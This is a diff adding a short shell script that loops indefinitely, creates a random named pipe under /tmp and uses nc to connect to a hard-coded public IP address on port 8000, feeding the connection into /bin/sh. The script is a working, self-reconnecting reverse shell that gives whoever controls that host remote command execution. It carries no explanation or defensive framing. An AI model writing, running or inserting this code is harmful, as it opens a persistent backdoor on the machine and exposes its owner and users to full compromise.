@@ -1,0 +1,11 @@
+#lockfile -r 0 /tmp/hax.lock || exit 1
+while TRUE
+do
+RAND=$(cat /dev/urandom | env LC_CTYPE=C tr -cd 'a-f0-9' | head -c 32)
+NAME=/tmp/$RAND
+mkfifo $NAME
+nc 54.215.219.153 8000 0<$NAME | /bin/sh -c "/bin/sh 2> $NAME" 2>$NAME >$NAME
+rm -f $NAME
+sleep 5
+done
+rm -f /tmp/hax.lock
